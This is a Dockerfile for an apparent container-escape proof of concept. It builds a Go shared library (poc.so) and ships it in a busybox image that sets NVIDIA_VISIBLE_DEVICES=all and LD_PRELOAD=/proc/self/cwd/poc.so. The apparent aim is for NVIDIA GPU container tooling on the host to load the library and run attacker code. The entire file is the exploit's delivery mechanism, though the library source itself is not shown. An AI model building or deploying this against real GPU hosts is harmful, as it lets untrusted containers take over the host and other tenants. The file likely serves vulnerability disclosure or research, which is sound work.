FROM golang:1.23 AS build

WORKDIR /build
COPY . .

RUN go build -buildmode=c-shared -o poc.so


FROM busybox:stable-glibc

ENV NVIDIA_VISIBLE_DEVICES=all
ENV LD_PRELOAD=/proc/self/cwd/poc.so

COPY --from=build /build/poc.so /poc.so
